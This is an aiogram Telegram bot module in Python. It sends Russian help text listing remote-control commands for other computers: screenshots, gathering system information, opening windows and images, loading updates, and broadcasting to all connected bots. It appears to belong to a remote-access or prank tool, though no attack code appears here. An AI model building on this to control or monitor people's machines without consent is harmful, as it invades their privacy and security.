from aiogram import types, Dispatcher
from create_bot import bot, ids


# Информация о том как начать использовать
async def about_start(message: types.Message):
    if message.from_user.id in ids:
        await bot.send_message(message.from_user.id, '''
Для получения списка команд напишите /commands
Для начала работы с ботом используйте /start_work
Для загрузки обновления /load_update
Примечание: ALL - означает отправку всем доступным ботам
''')


# Список команд
async def commands(message: types.Message):
    if message.from_user.id in ids:
        await bot.send_message(message.from_user.id, '''
Список команд
OpenWeb - Открыть сайт детский сайт
OpenNotepad - Открыть блокнот с вашим текстом
CloseCurrentWindow - Закрыть текущее открытое окно
GetScreenShot - Получить скриншот экрана
OpenImage - Отправить изображение и открыть
GetInfo - Получить информацию о компьютере
''')


def register_start_handler(dp: Dispatcher):
    dp.register_message_handler(about_start, commands=['start', 'help'])
    dp.register_message_handler(commands, commands=['commands'])
